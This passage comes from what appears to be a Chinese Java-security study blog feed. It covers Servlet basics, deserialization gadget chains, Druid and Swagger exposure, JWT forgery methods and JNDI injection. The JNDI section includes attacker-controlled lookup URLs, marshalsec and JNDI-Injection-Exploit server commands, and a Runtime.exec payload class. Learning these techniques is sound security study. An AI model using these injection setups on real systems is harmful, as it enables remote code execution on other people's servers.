class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HttpSessionListener</strong></p><p> 监听 Httpsession 域的创建于销毁的监听器 HttpSessionListener。<br>  HttpSession 对象的生命周期：<br>  （1）创建：第一次调用 request.getSession 时创建。<br>  （2）销毁：服务器关闭销毁 session 过期手动销毁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> zzs.listener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionAttributeListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionBindingEvent;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebListener()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FirstHttpSessionListener</span> <span class="keyword">implements</span> <span class="title class_">HttpSessionListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FirstHttpSessionListener</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionCreated</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;session创建id:&quot;</span>+se.getSession().getId());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sessionDestroyed</span><span class="params">(HttpSessionEvent se)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;session销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ServletRequestListener</strong></p><p>  ServletRequestlistener 监听 ServletRequest 域创建与销毁的监听器 ServletRequestListener<br>  ServletRequest 的生命周期<br>  （1）创建：每一次请求都会创建 request<br>  （2）销毁：请求结束</p>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全学习路径</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<p><strong>参考文章：</strong></p><p><a href="https://github.com/HackJava/HackJava">https://github.com/HackJava/HackJava</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全-反序列化</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><strong>CC链</strong><br><font color=red>CommonsCollections(CC)</font>反序列化攻击链</p><ul><li>CC1攻击链：<a href="https://hackerhao.top/2025/06/17/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">AnnotationInvocationHandler + Proxy + LazyMap + Transformer</a></li><li>CC2攻击链：<a href="">PriorityQueue + TransformingComparator + Transformer + TemplatesImpl</a></li><li>CC3攻击链：<a href="">AnnotationInvocationHandler + Proxy + LazyMap + Transformer + TrAXFilter + TemplatesImpl</a></li><li>CC4攻击链：<a href="">PriorityQueue + TransformingComparator + TrAXFilter + TemplatesImpl</a></li><li>CC5攻击链：<a href="">BadAttributeValueExpException + TiedMapEntry + LazyMap + Transformer</a></li><li>CC6攻击链：<a href="">HashSet + HashMap + TiedMapEntry + LazyMap + Transformer</a></li><li>CC7攻击链：<a href="">HashTable + TiedMapEntry + LazyMap + Transformer</a></li></ul><p><strong>CB链</strong><br><font color=red>CommonsBeanUtils(CB)</font>反序列化攻击链</p><ul><li>CB1攻击链：<a href="">PriorityQueue + BeanComparator + TemplatesImpl</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全-RCE执行,JNDI注入</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8-RCE%E6%89%A7%E8%A1%8C-JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8-RCE%E6%89%A7%E8%A1%8C-JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全-RCE执行-JNDI注入"><a href="#Java安全-RCE执行-JNDI注入" class="headerlink" title="Java安全-RCE执行,JNDI注入"></a>Java安全-RCE执行,JNDI注入</h1><h2 id="Java-安全-RCE-执行-5-大类函数调用"><a href="#Java-安全-RCE-执行-5-大类函数调用" class="headerlink" title="Java 安全 - RCE 执行 - 5 大类函数调用"></a>Java 安全 - RCE 执行 - 5 大类函数调用</h2><p>-Groovy</p><p>-RuntimeExec</p><p>-ProcessImpl</p><p>-ProcessBuilder</p><p>-ScriptEngineManager</p><p>检测：（大部分白盒）</p><p>黑盒看参数名和参数值</p><p>白盒看类函数名和可控变量</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p><h2 id="Java-安全-JNDI-注入-RMI-LDAP-版本-什么是-jndi-注入"><a href="#Java-安全-JNDI-注入-RMI-LDAP-版本-什么是-jndi-注入" class="headerlink" title="Java 安全 - JNDI 注入 - RMI&amp;LDAP &amp; 版本 什么是 jndi 注入"></a>Java 安全 - JNDI 注入 - RMI&amp;LDAP &amp; 版本 什么是 jndi 注入</h2><p>为什么有 jndi 注入</p><p>JDNI 注入安全问题（RCE）</p><p>JDNI 注入利用条件（看上图）</p><p>参考：<a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5-1024x365.png"></p><p>JNDI 全称为 Java Naming and DirectoryInterface（ Java 命名和目录接口）， 是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来 定义用户、网络、机器、对象和服务等各种资源。JNDI 支持的服务主要有：DNS、<br>LDAP、CORBA、RMI 等。<br>RMI：远程方法调用注册表 LDAP：轻量级目录访问协议</p><p>调用检索：<br>Java 为了将 Object 对象存储在 Naming 或 Directory 服务下，提供了 Naming<br>Reference 功能，对象可以通过绑定 Reference 存储在 Naming 或 Directory 服务 下，比如 RMI、LDAP 等。javax.naming.InitialContext.lookup ()<br>在 RMI 服务中调用了 InitialContext.lookup () 的类有：</p><p>调用检索：<br>Java 为了将 Object 对象存储在 Naming 或 Directory 服务下，提供了 Naming<br>Reference 功能，对象可以通过绑定 Reference 存储在 Naming 或 Directory 服务 下，比如 RMI、LDAP 等。javax.naming.InitialContext.lookup ()<br>在 RMI 服务中调用了 InitialContext.lookup () 的类有：</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全-JWT,Swagger接口,Druid监控</title>
      <link href="/2025/06/17/Java%E5%AE%89%E5%85%A8-JWT-Swagger%E6%8E%A5%E5%8F%A3-Druid%E7%9B%91%E6%8E%A7/"/>
      <url>/2025/06/17/Java%E5%AE%89%E5%85%A8-JWT-Swagger%E6%8E%A5%E5%8F%A3-Druid%E7%9B%91%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全-JWT-Swagger-接口-Druid-监控"><a href="#Java安全-JWT-Swagger-接口-Druid-监控" class="headerlink" title="Java安全-JWT,Swagger 接口,Druid 监控"></a>Java安全-JWT,Swagger 接口,Druid 监控</h1><blockquote><p>1，Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏<br>2，Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试<br>3，Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙提取</p></blockquote><h2 id="Java-安全-Druid-监控-未授权访问-信息泄漏"><a href="#Java-安全-Druid-监控-未授权访问-信息泄漏" class="headerlink" title="Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏"></a>Java 安全 - Druid 监控 - 未授权访问 &amp; 信息泄漏</h2><p>参考：<a href="https://developer.aliyun.com/article/1260382">https://developer.aliyun.com/article/1260382</a><br>Druid 是阿里巴巴数据库事业部出品，为监控而生的数据库连接池。Druid 提供的监控<br>功能，监控 SQL 的执行时间、监控 Web URI 的请求、Session 监控。当开发者配置不<br>当时就可能造成未授权访问漏洞。<br>攻击点：<br>1、直接拼接 URL 路径，尝试能否直接未授权访问系统功能点。<br>2、结合泄露 URL 路径和 Session 信息，利用 BurpSuite 进行尝试登录。<br>3、利用 Cookie 编辑器替换 Session，再次访问后台路径尝试进入后台。</p><p>利用方法：</p><p>通过目录扫描或手工输入路径 <a href="http://www.xxxx.com/druid/index.html%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%AD%98%E5%9C%A8">http://www.xxxx.com/druid/index.html，发现存在</a> Druid 未授权访问页面，重点关注 URL 监控和 Session 监控页面；</p><h2 id="Java-安全-Swagger-接口-导入-联动批量测试"><a href="#Java-安全-Swagger-接口-导入-联动批量测试" class="headerlink" title="Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试"></a>Java 安全 - Swagger 接口 - 导入 &amp; 联动批量测试</h2><p>Swagger 是一个用于生成、描述和调用 RESTful 接口的 Web 服务。就是将项目中所有<br>（想要暴露的）接口展现在页面上，并可以进行接口调用和测试的服务。所以可以对这个<br>接口进行漏洞测试，看是否存在未授权访问、sql 注入、文件上传等漏洞。由于接口太<br>多，一个个接口测试的话太费时间，所以一般会采用自动化接口漏洞安全测试。</p><p>访问：<a href="http://ip:port/swagger-ui.html">http://ip:port/swagger-ui.html</a><br>1、自动化发包测试<br>Postman：<a href="https://github.com/hlmd/Postman-cn">https://github.com/hlmd/Postman-cn</a><br>2、自动化漏洞测试<br>联动 BurpSuite Xray 等</p><h2 id="Java-安全-JWT-令牌-空算法-未签名-密匙获取"><a href="#Java-安全-JWT-令牌-空算法-未签名-密匙获取" class="headerlink" title="Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙获取"></a>Java 安全 - JWT 令牌 - 空算法 &amp; 未签名 &amp; 密匙获取</h2><p>JSON Web Token (JWT)。它遵循 JSON 格式，将用户信息加密到 token 里，服务器不<br>保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证 token，通过 token<br>验证用户身份。基于 token 的身份验证可以替代传统的 cookie+session 身份验证方<br>法。这使得 JWT 成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端<br>服务器无缝交互</p><p><a href="https://jwt.io/">https://jwt.io</a></p><p>1、标头（Header）</p><p>alg 字段通常用于表示加密采用的算法。如”HS256″、”RS256″等</p><p>typ 字段通常用于表示类型</p><p>2，有效载荷（Payload）</p><p>Payload 是 JWT 的第二个部分，这是一个 JSON 对象，主要承载了各种声明并传递明文</p><p>数据，用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明。</p><p>3，签名（Signature）</p><p>使用 “alg”: “none” 时，签名部分为空，直接以 . 结尾。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-42-1024x356.png"></p><p>一，空算法：</p><p>当 alg 为 none 时没有加密算法</p><p>可直接更改 Payload 中的信息并重新生成 base64 的编码发送</p><p>二，未签名</p><p>有些服务器并未验证 jwt 签名，可以直接尝试修改 payload，或者删除 Signature</p><p>三，暴力破解密钥</p><p>某些签名算法，例如 HS256 (HMAC+SHA-256)，会像密码一样使用一个任意的、独立的字符串作为秘密密钥。这个秘钥如被轻易猜到或暴力破解，则攻击者能以任意的头部和载荷值来创建 JT，然后用密钥重新给令牌签名。</p><p>四，源码泄露密钥</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-JNDI</title>
      <link href="/2025/06/17/Java-JNDI/"/>
      <url>/2025/06/17/Java-JNDI/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-JNDI"><a href="#Java-JNDI" class="headerlink" title="Java-JNDI"></a>Java-JNDI</h1><h2 id="JNDI-是什么"><a href="#JNDI-是什么" class="headerlink" title="JNDI 是什么"></a>JNDI 是什么</h2><p>JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。</p><p>JNDI 提供统一的客户端 API，通过不同的 JNDI 服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p><p>通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的命令服务和目录服务，如下图。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>LDAP</td><td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td></tr><tr><td>RMI</td><td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td></tr><tr><td>DNS</td><td>域名服务</td></tr><tr><td>CORBA</td><td>公共对象请求代理体系结构</td></tr></tbody></table><h2 id="JNDI-注入原理分析"><a href="#JNDI-注入原理分析" class="headerlink" title="JNDI 注入原理分析"></a>JNDI 注入原理分析</h2><p>JNDI 注入，即当开发者在定义 JNDI 接口初始化时，lookup() 方法的参数被外部攻击者可控，攻击者就可以将恶意的 url 传入参数，以此劫持被攻击的 Java 客户端的 JNDI 请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意 Java 对象载荷（reference 实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>;    <span class="comment">// 指定查找的 uri 变量</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri); <span class="comment">// 获取指定的远程对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中定义了 uri 变量，uri 变量可控，并定义了一个 rmi 协议服务， rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit 为攻击者控制的链接，最后使用 lookup () 函数进行远程获取 Exploit 类（Exploit 类名为攻击者定义，不唯一），并执行它。</p><p><strong>JNDI 远程调用：JNDI-Injection</strong></p><p>1，使用远程调用（默认端口 1389）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://xx.xx.xx.xx:1389/Test&quot;</span>);</span><br></pre></td></tr></table></figure><p>2，利用工具生成调用地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A xx.xx.xx.xx</span><br></pre></td></tr></table></figure><p><strong>JNDI 远程调用 - marshalsec</strong></p><p>2，利用工具生成调用地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A xx.xx.xx.xx</span><br></pre></td></tr></table></figure><p><strong>JNDI 远程调用 - marshalsec</strong></p><p>1，使用远程端口 (默认端口 1389)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://xx.xx.xx.xx:1389/Test&quot;</span>);</span><br></pre></td></tr></table></figure><p>2，编译对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java  <span class="comment">//编译为.class</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3，使用工具生成调用协议（rmi，ldap）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LADPRefServeer http:<span class="comment">//0.0.0.0/Test</span></span><br><span class="line">或者</span><br><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServeer http:<span class="comment">//0.0.0.0/Test</span></span><br></pre></td></tr></table></figure><p>注意：不同 JDK 版本中 JNDI 注入存在的限制及绕过方法</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5-1024x365.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE应用-Servlet</title>
      <link href="/2025/06/17/JavaEE%E5%BA%94%E7%94%A8-Servlet/"/>
      <url>/2025/06/17/JavaEE%E5%BA%94%E7%94%A8-Servlet/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaEE应用-Servlet"><a href="#JavaEE应用-Servlet" class="headerlink" title="JavaEE应用-Servlet"></a>JavaEE应用-Servlet</h1><h2 id="JavaEE-基础"><a href="#JavaEE-基础" class="headerlink" title="JavaEE 基础"></a>JavaEE 基础</h2><h3 id="一：Servlet-实现"><a href="#一：Servlet-实现" class="headerlink" title="一：Servlet 实现"></a>一：Servlet 实现</h3><p>继承抽象类 HttpServlet 的重写部分方法（常用）</p><p>添加注解 @WebServlet(“&#x2F;LoginServlet”)</p><blockquote><p>servlet3.0 引入了 @WebServlet,@WebFilter 等注解，可以代替在 web.xml 中通过 <servlet><filter > 等标签进行配置 , 从而可以摆脱掉 web.xml，@WebServlet(“&#x2F;LoginServlet”)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">创建 Indexservlet 的类</span><br><span class="line">    <span class="keyword">package</span> com.example.demo2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * servlet实现</span></span><br><span class="line"><span class="comment">    * 1，创建Class类</span></span><br><span class="line"><span class="comment">    * 2，继承HttpServlet类</span></span><br><span class="line"><span class="comment">    * 3，重写Service()方法(Service方法在Servelt类被访问时自动调用，作用：接受请求，响应结果)</span></span><br><span class="line"><span class="comment">    * 4，在Servlet中添加注解，设置资源对位访问路径，浏览器通过访问路径，访问到Servlet类</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@WebServlet(&quot;/ser01&quot;)</span> <span class="comment">//添加注解，访问路径</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Indexservlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello,Indexservlet&quot;</span>);  <span class="comment">//输出在控制台</span></span><br><span class="line">            <span class="comment">//响应数据</span></span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Hello,Index&quot;</span>);  <span class="comment">//输出到客户端</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="二：Servlet-的工作流程与生命周期"><a href="#二：Servlet-的工作流程与生命周期" class="headerlink" title="二：Servlet 的工作流程与生命周期"></a>二：Servlet 的工作流程与生命周期</h3><p>Servlet 的生命周期可以分为四个阶段，即装载类及创建实例阶段、初始化阶段、服务阶段和实例销毁阶段。</p><ul><li>1、初始化阶段  调用 init () 方法</li><li>2、响应客户请求阶段。调用 service () 方法，由 service () 方法根据提交的方式选择执行 doGet () 或者 doPost () 方法</li><li>3、终止阶段　　调用 destroy () 方法</li></ul><p>工作流程：</p><ul><li>通过请求头获知浏览器访问的是哪个主机</li><li>在通过请求行获取访问的是哪个 web 应用</li><li>再通过请求行中的请求路径获知访问的是哪个资源</li><li>通过获取的资源路径在配置中匹配到真实路径</li><li>服务器会创建 servlet 对象，（如果第一次访问时，创建 - servlet 实例，并调用 init 方法进行初始化操作）</li><li>调用 service（request，response）方法来处理请求和响应的操作</li><li>调用 service 完毕后返回服务器 由服务器将 response 缓冲区的数据取出</li></ul><h3 id="三，HttpServleRequest-对象"><a href="#三，HttpServleRequest-对象" class="headerlink" title="三，HttpServleRequest 对象"></a>三，HttpServleRequest 对象</h3><p> 作用：主要用来接受客户端发送过来的请求信息。例如：请求的参数，发送的头信息等都属于客户端发来的信息，service () 方法中的形参接受的是 HttpServletRequest 接口的实例化对象，表示对象主要运用在 HTTP 协议上，该对象有 Tomcat 封装好传递过来</p><p><strong>接受请求：</strong></p><p>常用方法：</p><p>getRequestURL ()：获取客户端发出请求时的完整 URL</p><p>getRequestURL ()：获取请求行中的资源名称部分（项目名称开始）</p><p>getQueryString ()：获取请求行中的参数部分</p><p>getMethod ()：获取客户端的请求方式</p><p>getProtocol ()：获取 HTTP 版本号</p><p>getContextPath ()：获取 webapp 名字（站点名）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> req.getRequestURL().toString();</span><br><span class="line">System.out.println(<span class="string">&quot;获取客户端请求的完整URL &quot;</span>+url);</span><br><span class="line"><span class="comment">//获取客户端请求的完整URL （从http 开始，到？前面结束）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> req.getRequestURI();</span><br><span class="line">System.out.println(<span class="string">&quot;获取客户端请求的完整URi &quot;</span>+uri);</span><br><span class="line"><span class="comment">//获取请求中的参数部分</span></span><br><span class="line">String queryString=req.getQueryString();</span><br><span class="line">System.out.println(<span class="string">&quot;获取请求中的参数部分:&quot;</span>+queryString);</span><br><span class="line"><span class="comment">//获取客户端的请求方式</span></span><br><span class="line"><span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> req.getMethod();</span><br><span class="line">System.out.println(<span class="string">&quot;获取客户端的请求方式:&quot;</span>+method);</span><br><span class="line"><span class="comment">//获取HTTP版本号</span></span><br><span class="line">String protocol=req.getProtocol();</span><br><span class="line">System.out.println(<span class="string">&quot;获取HTTP版本号:&quot;</span>+protocol);</span><br><span class="line"><span class="comment">//获取webapp名字（站点名）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">webapp</span> <span class="operator">=</span>req.getContextPath();</span><br><span class="line">System.out.println(<span class="string">&quot;获取webapp名字（站点名）:&quot;</span>+webapp);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">        *获取请求参数</span></span><br><span class="line"><span class="comment">        *   1.通过参数名获取参数值， 返回字符串</span></span><br><span class="line"><span class="comment">        *   req.getParameter(&quot;参数名&quot;);</span></span><br><span class="line"><span class="comment">        *      参数名：</span></span><br><span class="line"><span class="comment">        *         1.表达元素name属性值</span></span><br><span class="line"><span class="comment">        *         2.ajax的data属性值的键</span></span><br><span class="line"><span class="comment">        *         3.超链接参数的键</span></span><br><span class="line"><span class="comment">        *   2.通过参数名获取所有的参数值，返回数组</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        **   */</span></span><br><span class="line">        <span class="comment">//获取用户名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uname</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;unmae&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">upwd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;upwd&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span>+uname+<span class="string">&quot;密码&quot;</span>+upwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过参数名获取所有的参数值，返回数组</span></span><br><span class="line">        String[] hobby =req.getParameterValues(<span class="string">&quot;hobby&quot;</span>);</span><br><span class="line">        